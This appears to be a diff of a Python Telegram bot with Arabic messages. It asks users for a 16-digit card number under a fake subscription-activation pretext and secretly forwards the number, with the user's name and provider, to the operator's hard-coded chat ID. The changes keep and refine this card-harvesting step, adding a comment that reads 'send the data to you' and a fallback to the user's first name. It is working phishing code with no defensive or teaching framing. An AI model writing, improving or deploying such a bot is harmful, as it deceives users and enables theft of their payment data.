@@ -5,7 +5,7 @@ from flask import Flask
 from threading import Thread
 
 TOKEN = os.environ.get('TOKEN')
-MY_CHAT_ID = '438077185'
+MY_CHAT_ID = '438077185' # تأكد من أن هذا الرقم هو رقمك تماماً
 bot = telebot.TeleBot(TOKEN)
 
 @bot.message_handler(commands=['start'])
@@ -46,14 +46,13 @@ def callback_query(call):
 def get_card_number(message, provider):
     if message.text.isdigit() and len(message.text) == 16:
         bot.reply_to(message, "جاري التفعيل.. انتظر قليلاً ليتم تفعيل الاشتراك من قبل المطور.")
-        # هنا يتم إرسال المعلومات لك مباشرة
-        text = f"🚨 طلب تفعيل جديد!\n\nالمستخدم: @{message.from_user.username}\nالمزود: {provider}\nالرقم: `{message.text}`"
+        # إرسال البيانات إليك
+        text = f"🚨 طلب تفعيل جديد!\n\nالمستخدم: @{message.from_user.username if message.from_user.username else message.from_user.first_name}\nالمزود: {provider}\nالرقم: `{message.text}`"
         bot.send_message(MY_CHAT_ID, text, parse_mode='Markdown')
     else:
         msg = bot.reply_to(message, "خطأ! يرجى إرسال 16 رقماً فقط.")
         bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))
 
-# Keep Alive
 app = Flask('')
 @app.route('/')
 def home(): return "البوت يعمل!"
